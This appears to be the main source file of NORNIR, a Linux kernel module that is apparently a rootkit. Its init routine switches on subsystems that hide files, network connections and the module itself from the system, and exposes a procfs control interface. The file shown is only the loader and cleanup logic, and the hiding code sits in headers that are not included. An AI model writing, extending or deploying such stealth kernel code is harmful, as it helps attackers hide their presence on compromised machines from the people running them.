/**
 * Copyright (c) 2024 arttnba3 <arttnba@gmail.com>
 * 
 * This work is licensed under the terms of the GNU GPL, version 2 or later.
 */

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/cred.h>
#include "common/logger.h"
#include "fs/hide.h"
#include "libs/hooks.h"
#include "mod/hide.h"
#include "net/hide.h"
#include "uapi/procfs.h"

static __init int nornir_init(void)
{
    int error;

    logger_info("Start loading the NORNIR kernel module...\n");

#ifdef CONFIG_NORNIR_PROCFS_UAPI
    error = nornir_procfs_uapi_init();
    if (error) {
        logger_error(
            "Unable to initialize procfs uapi, error code: %d.\n",
            error
        );
        goto err_procfs;
    }
#endif

#ifdef CONFIG_NORNIR_HIDE_FILE
    error = nornir_init_file_hidden_subsystem();
    if (error) {
        logger_error(
            "Unable to initialize hide-file subsystem, error code: %d.\n",
            error
        );
        goto err_hide_file;
    }
#endif

#ifdef CONFIG_NORNIR_HIDE_CONN
    error = nornir_init_conn_hidden_subsystem();
    if (error) {
        logger_error(
            "Unable to initialize hide-conn subsystem, error code: %d.\n",
            error
        );
        goto err_hide_conn;
    }
#endif

#ifdef CONFIG_NORNIR_HIDE_MOD
    error = nornir_init_module_hidden_subsystem();
    if (error) {
        logger_error(
            "Unable to initialize hide-module subsystem, error code: %d.\n",
            error
        );
        goto err_hide_mod;
    }
#endif

    logger_info("NORNIR kernel module loaded done.\n");

    return 0;

#ifdef CONFIG_NORNIR_HIDE_MOD
err_hide_mod:
#endif
#ifdef CONFIG_NORNIR_HIDE_CONN
err_hide_conn:
#endif
#ifdef CONFIG_NORNIR_HIDE_FILE
    nornir_unload_file_hidden_subsystem();
err_hide_file:
#endif
#ifdef CONFIG_NORNIR_PROCFS_UAPI
err_procfs:
#endif
    logger_error("Initialization aborted. Load failed.\n");

    return error;
}

static __exit void nornir_exit(void)
{
    logger_info("Start unloading the NORNIR kernel module...\n");

#ifdef CONFIG_NORNIR_HIDE_MOD
    logger_alert("We do NOT implement methods to repair module struct yet:(\n");
#endif

#ifdef CONFIG_NORNIR_HIDE_FILE
    nornir_unload_file_hidden_subsystem();
#endif

#ifdef CONFIG_NORNIR_PROCFS_UAPI
    nornir_procfs_uapi_exit();
#endif

    logger_info("NORNIR kernel module unloaded done. See you next time.\n");
}

module_init(nornir_init);
module_exit(nornir_exit);
MODULE_LICENSE("GPL v2");
MODULE_AUTHOR("arttnba3");
